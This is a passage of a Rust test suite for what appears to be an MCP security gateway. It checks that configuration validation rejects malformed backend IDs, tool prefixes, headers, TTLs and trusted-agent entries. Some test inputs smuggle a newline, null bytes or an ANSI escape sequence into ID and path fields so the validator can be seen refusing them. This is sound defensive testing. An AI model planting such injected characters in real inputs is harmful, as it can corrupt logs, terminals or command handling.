    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: None,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-003: Duplicate protocols in restricted_transports rejected.
#[test]
fn test_r43_003_restricted_transports_duplicate_rejected() {
    let config = crate::TransportConfig {
        restricted_transports: vec![
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::WebSocket,
            vellaveto_types::TransportProtocol::Grpc,
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate") && err.contains("restricted_transports"),
        "expected restricted_transports duplicate error: {err}"
    );
}

/// FIND-R43-003: Unique restricted_transports pass validation.
#[test]
fn test_r43_003_restricted_transports_unique_pass() {
    let config = crate::TransportConfig {
        restricted_transports: vec![
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::WebSocket,
        ],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-004: Backend ID exceeding max length rejected.
#[test]
fn test_r43_004_backend_id_too_long_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "x".repeat(129),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max length"),
        "expected max length error: {err}"
    );
}

/// FIND-R43-004: Backend ID with non-ASCII characters rejected.
#[test]
fn test_r43_004_backend_id_non_ascii_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "backend\ninjection".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("invalid characters"),
        "expected invalid characters error: {err}"
    );
}

/// FIND-R43-004: Backend ID with spaces rejected.
#[test]
fn test_r43_004_backend_id_spaces_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "backend one".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("invalid characters"),
        "expected invalid characters error: {err}"
    );
}

/// FIND-R43-004: Valid backend IDs pass (alphanumeric, hyphen, underscore, dot).
#[test]
fn test_r43_004_backend_id_valid_characters_pass() {
    for id in &["my-backend", "backend_1", "b.prod.us-east", "A1-z2_3.4"] {
        let config = crate::GatewayConfig {
            enabled: true,
            backends: vec![crate::BackendConfig {
                id: id.to_string(),
                url: "http://localhost:8000".to_string(),
                tool_prefixes: vec![],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            }],
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "valid ID '{id}' should pass");
    }
}

/// FIND-R43-005: Duplicate tool_prefix across backends rejected.
#[test]
fn test_r43_005_duplicate_tool_prefix_across_backends_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![
            crate::BackendConfig {
                id: "a".to_string(),
                url: "http://a:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
            crate::BackendConfig {
                id: "b".to_string(),
                url: "http://b:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate tool_prefix"),
        "expected duplicate tool_prefix error: {err}"
    );
}

/// FIND-R43-005: Duplicate tool_prefix within same backend rejected.
#[test]
fn test_r43_005_duplicate_tool_prefix_within_backend_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["fs_".to_string(), "db_".to_string(), "fs_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate tool_prefix"),
        "expected duplicate tool_prefix error: {err}"
    );
}

/// FIND-R43-005: Empty tool_prefix string rejected.
#[test]
fn test_r43_005_empty_tool_prefix_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["fs_".to_string(), "".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tool_prefixes") && err.contains("must not be empty"),
        "expected empty tool_prefix error: {err}"
    );
}

/// FIND-R43-005: Too-long tool_prefix rejected.
#[test]
fn test_r43_005_tool_prefix_too_long_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["x".repeat(257)],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max length"),
        "expected max length error: {err}"
    );
}

/// FIND-R43-005: Unique tool_prefixes across backends pass.
#[test]
fn test_r43_005_unique_tool_prefixes_pass() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![
            crate::BackendConfig {
                id: "a".to_string(),
                url: "http://a:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string(), "file_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
            crate::BackendConfig {
                id: "b".to_string(),
                url: "http://b:8000".to_string(),
                tool_prefixes: vec!["db_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
        ],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// ADVERSARIAL AUDIT ROUND 44 TESTS
// ═══════════════════════════════════════════════════

/// FIND-R44-005: stdio_command with null byte rejected.
#[test]
fn test_stdio_command_null_byte_rejected() {
    let config = crate::TransportConfig {
        stdio_command: Some("/usr/bin/safe\0_path".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("null byte"), "got: {err}");
}

/// FIND-R44-006: Backend URL with mixed-case scheme accepted.
#[test]
fn test_gateway_backend_url_mixed_case_scheme() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "HTTP://localhost:8080/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    assert!(
        config.validate().is_ok(),
        "mixed-case HTTP should be accepted"
    );
}

/// FIND-R44-006: transport_urls with mixed-case WS scheme accepted.
#[test]
fn test_gateway_transport_url_mixed_case_ws() {
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        vellaveto_types::TransportProtocol::WebSocket,
        "WS://localhost:8080/ws".to_string(),
    );
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "http://localhost:8080/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    assert!(
        config.validate().is_ok(),
        "mixed-case WS should be accepted"
    );
}

/// FIND-R44-007: Glob key with ASCII control characters rejected.
#[test]
fn test_transport_overrides_control_chars_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "tool_\x1B[2Jclear".to_string(), // ANSI escape code
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control"), "got: {err}");
}

/// FIND-R44-007: Glob key with DEL (0x7F) rejected.
#[test]
fn test_transport_overrides_del_char_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "tool_\x7F".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control"), "got: {err}");
}

// ═══════════════════════════════════════════════════
// MCP 2025-11-25 StreamableHttpConfig (Phase 30)
// ═══════════════════════════════════════════════════

#[test]
fn test_streamable_http_config_defaults() {
    let config = crate::StreamableHttpConfig::default();
    assert!(!config.resumability_enabled);
    assert!(!config.strict_tool_name_validation);
    assert_eq!(config.max_event_id_length, 128);
    assert_eq!(config.sse_retry_ms, None);
    assert_eq!(
        config.protocol_version_floor,
        vellaveto_types::McpProtocolVersion::V2025_11_25
    );
    assert!(config.require_protocol_version_header);
    assert!(config.allowed_mcp_param_headers.is_empty());
    assert_eq!(
        config.supported_protocol_versions(),
        vec!["2026-07-28", "2025-11-25"]
    );
    assert!(config.validate().is_ok());
}

#[test]
fn test_streamable_http_config_max_event_id_length_zero_rejected() {
    let config = crate::StreamableHttpConfig {
        max_event_id_length: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_event_id_length"), "got: {err}");
}

#[test]
fn test_streamable_http_config_max_event_id_length_over_512_rejected() {
    let config = crate::StreamableHttpConfig {
        max_event_id_length: 513,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_event_id_length"), "got: {err}");
}

#[test]
fn test_streamable_http_config_max_event_id_length_boundary_accepted() {
    for len in [1, 512] {
        let config = crate::StreamableHttpConfig {
            max_event_id_length: len,
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "len={len} should be valid");
    }
}

#[test]
fn test_streamable_http_config_sse_retry_ms_bounds() {
    // Below minimum
    let config = crate::StreamableHttpConfig {
        sse_retry_ms: Some(99),
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // Above maximum
    let config = crate::StreamableHttpConfig {
        sse_retry_ms: Some(60_001),
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // At boundaries
    for ms in [100, 60_000] {
        let config = crate::StreamableHttpConfig {
            sse_retry_ms: Some(ms),
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "ms={ms} should be valid");
    }
}

#[test]
fn test_streamable_http_config_serde_roundtrip() {
    let config = crate::StreamableHttpConfig {
        resumability_enabled: true,
        strict_tool_name_validation: true,
        max_event_id_length: 256,
        sse_retry_ms: Some(5000),
        protocol_version_floor: vellaveto_types::McpProtocolVersion::V2025_11_25,
        require_protocol_version_header: true,
        allowed_mcp_param_headers: vec!["Region".to_string(), "TenantId".to_string()],
    };
    let json = serde_json::to_string(&config).expect("serialize");
    let deser: crate::StreamableHttpConfig = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(config, deser);
}

#[test]
fn test_streamable_http_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [streamable_http]
        resumability_enabled = true
        strict_tool_name_validation = true
        max_event_id_length = 256
        sse_retry_ms = 3000
        protocol_version_floor = "2025-11-25"
        require_protocol_version_header = true
        allowed_mcp_param_headers = ["Region", "TenantId"]
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.streamable_http.resumability_enabled);
    assert!(config.streamable_http.strict_tool_name_validation);
    assert_eq!(config.streamable_http.max_event_id_length, 256);
    assert_eq!(config.streamable_http.sse_retry_ms, Some(3000));
    assert_eq!(
        config.streamable_http.protocol_version_floor,
        vellaveto_types::McpProtocolVersion::V2025_11_25
    );
    assert!(config.streamable_http.require_protocol_version_header);
    assert_eq!(
        config.streamable_http.allowed_mcp_param_headers,
        vec!["Region", "TenantId"]
    );
}

#[test]
fn test_streamable_http_config_protocol_version_floor_rejects_legacy() {
    let config = crate::StreamableHttpConfig::default();
    assert!(config.allows_protocol_version(vellaveto_types::McpProtocolVersion::V2025_11_25));
    assert!(config.allows_protocol_version(vellaveto_types::McpProtocolVersion::V2026_07_28));
    assert!(!config.allows_protocol_version(vellaveto_types::McpProtocolVersion::V2025_06_18));
    assert!(!config.allows_protocol_version(vellaveto_types::McpProtocolVersion::V2025_03_26));
}

#[test]
fn test_streamable_http_config_protocol_version_floor_can_be_lowered_explicitly() {
    let config = crate::StreamableHttpConfig {
        protocol_version_floor: vellaveto_types::McpProtocolVersion::V2025_03_26,
        ..Default::default()
    };
    assert_eq!(
        config.supported_protocol_versions(),
        vec!["2026-07-28", "2025-11-25", "2025-06-18", "2025-03-26"]
    );
}

#[test]
fn test_streamable_http_config_allowed_mcp_param_headers_validate() {
    let config = crate::StreamableHttpConfig {
        allowed_mcp_param_headers: vec!["Region".to_string(), "TenantId".to_string()],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_streamable_http_config_allowed_mcp_param_headers_reject_invalid_token() {
    let config = crate::StreamableHttpConfig {
        allowed_mcp_param_headers: vec!["Bad Header".to_string()],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("HTTP field-name token"), "got: {err}");
}

#[test]
fn test_streamable_http_config_allowed_mcp_param_headers_reject_reserved() {
    let config = crate::StreamableHttpConfig {
        allowed_mcp_param_headers: vec!["Authorization".to_string()],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("reserved"), "got: {err}");
}

#[test]
fn test_streamable_http_config_allowed_mcp_param_headers_reject_duplicate() {
    let config = crate::StreamableHttpConfig {
        allowed_mcp_param_headers: vec!["Region".to_string(), "REGION".to_string()],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicated"), "got: {err}");
}

#[test]
fn test_acis_provenance_and_containment_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [acis]
        require_session_id = true
        require_agent_identity = true
        require_verified_signature = true
        detached_request_signature_max_age_secs = 900
        detached_request_signature_max_future_skew_secs = 120
        require_workload_binding = true
        require_ephemeral_client_provenance = true
        deny_replay = true
        block_tainted_privileged_sinks = true
        require_lineage_for_privileged_sinks = true
        containment_mode = "require_approval"

        [[acis.trusted_request_signers]]
        key_id = "client-key-1"
        public_key = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        session_key_scope = "ephemeral_session"
        execution_is_ephemeral = true

        [acis.trusted_request_signers.workload_identity]
        platform = "spiffe"
        workload_id = "spiffe://cluster/ns/prod/sa/api"
        namespace = "prod"
        service_account = "api"
        attestation_level = "jwt"
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.acis.require_session_id);
    assert!(config.acis.require_agent_identity);
    assert!(config.acis.require_verified_signature);
    assert_eq!(config.acis.detached_request_signature_max_age_secs, 900);
    assert_eq!(
        config.acis.detached_request_signature_max_future_skew_secs,
        120
    );
    assert!(config.acis.require_workload_binding);
    assert!(config.acis.require_ephemeral_client_provenance);
    assert!(config.acis.deny_replay);
    assert!(config.acis.block_tainted_privileged_sinks);
    assert!(config.acis.require_lineage_for_privileged_sinks);
    assert_eq!(
        config.acis.containment_mode,
        Some(vellaveto_types::ContainmentMode::RequireApproval)
    );
    assert_eq!(config.acis.trusted_request_signers.len(), 1);
    assert_eq!(
        config.acis.trusted_request_signers[0].key_id,
        "client-key-1"
    );
    assert_eq!(
        config.acis.trusted_request_signers[0].session_key_scope,
        vellaveto_types::SessionKeyScope::EphemeralSession
    );
    assert!(config.acis.trusted_request_signers[0].execution_is_ephemeral);
    assert_eq!(
        config.acis.trusted_request_signers[0]
            .workload_identity
            .as_ref()
            .map(|identity| identity.workload_id.as_str()),
        Some("spiffe://cluster/ns/prod/sa/api")
    );
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISCOVERY CONFIG (Phase 34)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_discovery_config_defaults() {
    let config = crate::DiscoveryConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.max_results, 5);
    assert_eq!(config.default_ttl_secs, 300);
    assert_eq!(config.max_index_entries, 10_000);
    assert!((config.min_relevance_score - 0.1).abs() < f64::EPSILON);
    assert!(config.token_budget.is_none());
    assert!(config.auto_index_on_tools_list);
}

#[test]
fn test_discovery_config_validate_default_passes() {
    let config = crate::DiscoveryConfig::default();
    config.validate().unwrap();
}

#[test]
fn test_discovery_config_validate_max_results_zero() {
    let config = crate::DiscoveryConfig {
        max_results: 0,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_results"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_max_results_exceeds() {
    let config = crate::DiscoveryConfig {
        max_results: 100,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_results"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_ttl_zero() {
    let config = crate::DiscoveryConfig {
        default_ttl_secs: 0,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_ttl_secs"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_ttl_exceeds() {
    let config = crate::DiscoveryConfig {
        default_ttl_secs: 100_000,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_ttl_secs"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_index_entries_zero() {
    let config = crate::DiscoveryConfig {
        max_index_entries: 0,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_index_entries"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_index_entries_exceeds() {
    let config = crate::DiscoveryConfig {
        max_index_entries: 100_000,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_index_entries"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_min_relevance_nan() {
    let config = crate::DiscoveryConfig {
        min_relevance_score: f64::NAN,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_min_relevance_negative() {
    let config = crate::DiscoveryConfig {
        min_relevance_score: -0.1,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_min_relevance_exceeds_one() {
    let config = crate::DiscoveryConfig {
        min_relevance_score: 1.1,
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_token_budget_zero() {
    let config = crate::DiscoveryConfig {
        token_budget: Some(0),
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("token_budget"), "got: {err}");
}

#[test]
fn test_discovery_config_validate_token_budget_exceeds() {
    let config = crate::DiscoveryConfig {
        token_budget: Some(2_000_000),
        ..crate::DiscoveryConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("token_budget"), "got: {err}");
}

#[test]
fn test_discovery_config_serde_roundtrip() {
    let config = crate::DiscoveryConfig {
        enabled: true,
        max_results: 10,
        default_ttl_secs: 600,
        max_index_entries: 5_000,
        min_relevance_score: 0.2,
        token_budget: Some(50_000),
        auto_index_on_tools_list: false,
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: crate::DiscoveryConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_discovery_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 10
        default_ttl_secs = 600
        min_relevance_score = 0.2
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.discovery.enabled);
    assert_eq!(config.discovery.max_results, 10);
    assert_eq!(config.discovery.default_ttl_secs, 600);
    assert!((config.discovery.min_relevance_score - 0.2).abs() < f64::EPSILON);
}

#[test]
fn test_discovery_config_policy_config_validate_passes() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 5
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    config.validate().unwrap();
}

#[test]
fn test_discovery_config_policy_config_validate_rejects_invalid() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 100
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    let err = config.validate().unwrap_err();
    assert!(err.contains("discovery"), "got: {err}");
}

// ═══════════════════════════════════════════════════════════════════════════════
// PROJECTOR CONFIG TESTS (Phase 35.1)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_projector_config_default() {
    let config = crate::ProjectorConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.default_model_family, "generic");
    assert!(config.auto_detect_model);
    assert!(!config.compress_schemas);
    assert!(config.max_schema_tokens.is_none());
    assert!(config.repair_malformed_calls);
}

#[test]
fn test_projector_config_validate_valid_families() {
    for family in &["claude", "openai", "deepseek", "qwen", "generic"] {
        let config = crate::ProjectorConfig {
            default_model_family: family.to_string(),
            ..Default::default()
        };
        config.validate().unwrap();
    }
}

#[test]
fn test_projector_config_validate_custom_family() {
    let config = crate::ProjectorConfig {
        default_model_family: "custom:llama".to_string(),
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_validate_invalid_family() {
    let config = crate::ProjectorConfig {
        default_model_family: "invalid_family".to_string(),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_model_family"), "got: {err}");
}

#[test]
fn test_projector_config_validate_max_schema_tokens_zero() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(0),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_schema_tokens"), "got: {err}");
}

#[test]
fn test_projector_config_validate_max_schema_tokens_exceeds() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(2_000_000),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_schema_tokens"), "got: {err}");
}

#[test]
fn test_projector_config_validate_max_schema_tokens_valid() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(500_000),
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_validate_max_schema_tokens_none() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: None,
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_serde_roundtrip() {
    let config = crate::ProjectorConfig {
        enabled: true,
        default_model_family: "claude".to_string(),
        auto_detect_model: false,
        compress_schemas: true,
        max_schema_tokens: Some(100_000),
        repair_malformed_calls: false,
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: crate::ProjectorConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_projector_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "openai"
        auto_detect_model = false
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.projector.enabled);
    assert_eq!(config.projector.default_model_family, "openai");
    assert!(!config.projector.auto_detect_model);
}

#[test]
fn test_projector_config_policy_config_validate_passes() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "deepseek"
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    config.validate().unwrap();
}

#[test]
fn test_projector_config_policy_config_validate_rejects_invalid() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "gpt4"
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    let err = config.validate().unwrap_err();
    assert!(err.contains("projector"), "got: {err}");
}

// ═══════════════════════════════════════════════════════════════════════════════
// FEDERATION CONFIG TESTS (Phase 39)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_federation_config_default_ttl_values() {
    let config = crate::abac::FederationConfig::default();
    assert_eq!(config.jwks_cache_ttl_secs, 300);
    assert_eq!(config.jwks_fetch_timeout_secs, 10);
    assert!(!config.enabled);
    assert!(config.trust_anchors.is_empty());
}

#[test]
fn test_federation_config_validation_ttl_too_low() {
    let config = AbacConfig {
        enabled: true,
        federation: crate::abac::FederationConfig {
            enabled: true,
            jwks_cache_ttl_secs: 5, // below min 60 (FIND-R50-017)
            ..crate::abac::FederationConfig::default()
        },
        ..AbacConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("jwks_cache_ttl_secs"));
}

#[test]
fn test_federation_config_validation_duplicate_org_id() {
    let anchor = vellaveto_types::FederationTrustAnchor {
        org_id: "org-1".to_string(),
        display_name: "Org 1".to_string(),
        jwks_uri: Some("https://keys.example.com/jwks".to_string()),
        issuer_pattern: "https://auth.example.com".to_string(),
        identity_mappings: vec![],
        trust_level: "limited".to_string(),
    };
    let config = AbacConfig {
        enabled: true,
        federation: crate::abac::FederationConfig {
            enabled: true,
            trust_anchors: vec![anchor.clone(), anchor],
            ..crate::abac::FederationConfig::default()
        },
        ..AbacConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("duplicate"));
}

#[test]
fn test_federation_config_validation_valid() {
    let config = AbacConfig {
        enabled: true,
        federation: crate::abac::FederationConfig {
            enabled: true,
            jwks_cache_ttl_secs: 600,
            jwks_fetch_timeout_secs: 15,
            trust_anchors: vec![vellaveto_types::FederationTrustAnchor {
                org_id: "org-1".to_string(),
                display_name: "Partner Org".to_string(),
                jwks_uri: Some("https://keys.example.com/jwks".to_string()),
                issuer_pattern: "https://auth.example.com".to_string(),
                identity_mappings: vec![],
                trust_level: "limited".to_string(),
            }],
            ..crate::abac::FederationConfig::default()
        },
        ..AbacConfig::default()
    };
    // Should pass validation (valid TTLs, no duplicate org_ids)
    assert!(config.validate().is_ok());
}

// ════════════════════════════════════════════════════════════════════════
// FIND-R53-P3: Round 53 P3 findings — config validation hardening
// ════════════════════════════════════════════════════════════════════════

/// Helper: minimal valid PolicyConfig for round-53 tests.
fn r53_base_config() -> PolicyConfig {
    PolicyConfig::from_toml(
        r#"
[[policies]]
name = "r53"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .expect("r53_base_config TOML must parse")
}

// ── Finding 3: BehavioralDetectionConfig.min_sessions upper bound ─────

#[test]
fn test_validate_rejects_behavioral_min_sessions_too_large() {
    let mut config = r53_base_config();
    config.behavioral.min_sessions = 10_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("behavioral.min_sessions"),
        "expected min_sessions error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_behavioral_min_sessions_at_max() {
    let mut config = r53_base_config();
    config.behavioral.min_sessions = 10_000;
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("behavioral.min_sessions"),
            "min_sessions=10000 should be accepted, got: {e}"
        );
    }
}

// ── Finding 4: CrossAgentConfig trusted_agents + max_privilege_gap ────

#[test]
fn test_validate_rejects_cross_agent_empty_trusted_agent() {
    let mut config = r53_base_config();
    config.cross_agent.trusted_agents = vec!["".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trusted_agents") && err.contains("must not be empty"),
        "expected empty trusted_agent error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_cross_agent_trusted_agent_too_long() {
    let mut config = r53_base_config();
    config.cross_agent.trusted_agents = vec!["x".repeat(257)];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trusted_agents") && err.contains("exceeds max length"),
        "expected length error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_cross_agent_trusted_agent_control_chars() {
    let mut config = r53_base_config();
    config.cross_agent.trusted_agents = vec!["agent\x00id".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trusted_agents") && err.contains("control"),
        "expected control char error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_cross_agent_max_privilege_gap_too_large() {
    let mut config = r53_base_config();
    config.cross_agent.max_privilege_gap = 11;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max_privilege_gap"),
        "expected max_privilege_gap error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_cross_agent_max_privilege_gap_at_max() {
    let mut config = r53_base_config();
    config.cross_agent.max_privilege_gap = 10;
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("max_privilege_gap"),
            "max_privilege_gap=10 should be accepted, got: {e}"
        );
    }
}

#[test]
fn test_validate_accepts_cross_agent_valid_trusted_agents() {
    let mut config = r53_base_config();
    config.cross_agent.trusted_agents = vec!["agent-alpha".to_string(), "agent-beta".to_string()];
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("trusted_agents"),
            "valid trusted_agents should be accepted, got: {e}"
        );
    }
}

// ── Finding 5: SchemaPoisoningConfig.min_observations upper bound ─────

#[test]
fn test_validate_rejects_schema_poisoning_min_observations_too_large() {
    let mut config = r53_base_config();
    config.schema_poisoning.min_observations = 10_001;
